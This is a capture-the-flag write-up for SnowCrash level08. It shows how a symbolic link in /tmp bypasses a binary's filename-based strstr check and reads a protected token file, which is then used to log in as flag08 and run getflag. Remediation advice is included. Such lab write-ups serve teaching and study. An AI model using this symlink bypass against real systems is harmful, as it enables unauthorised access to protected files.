# Level08 - Symbolic Link Vulnerability Exploitation

## Description
The binary in this level (`level08`) implements file reading functionality but restricts access to specific files, such as `token`. 
However, due to a symbolic link vulnerability, it is possible to bypass the restriction and read the contents of the `token` file by leveraging symbolic links.

---

## Vulnerability
The vulnerability arises because the program:
1. Uses the `strstr` function to check if the filename contains the string "token".
2. Does not perform a secure validation of file ownership or permissions before opening the file.

By creating a symbolic link pointing to the `token` file, we can bypass the restriction by using an indirect reference.

---

## Steps to Exploit

### Step 1: Analyze the Binary
```bash
level08@SnowCrash:~$ ./level08
./level08 [file to read]

The binary takes a filename as an argument.
```
### Step 2: Direct Access Denied
Attempting to directly access the token file fails:

```bash

level08@SnowCrash:~$ ./level08 token
You may not access 'token'
```
### Step 3: Using Symbolic Links
create a symlink 
```bash

level08@SnowCrash:~$ ln -s $(pwd)/token /tmp/symlink

```
the name dose not contain token to avoid the strstr check .

```bash

level08@SnowCrash:~$ ./level08 /tmp/symlink
xxxxxxxxxxxxxxx
level08@SnowCrash:~$ 
```
This bypasses the restriction, and the program reads the contents of the token file.

### Output
the contents of the token file is code that can be used to get the flag08


```bash
level08@SnowCrash:~$ su flag08
Password: "past token content "
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : xxxxxxxxxxxxxxxxxxxxxxxxxxx

```
## Notes

We had to use the full path of the target file when creating the symbolic link to avoid "No such file or directory" errors.

## To fix this vulnerability:

Validate file ownership and permissions before accessing files.
Avoid relying solely on filename-based checks.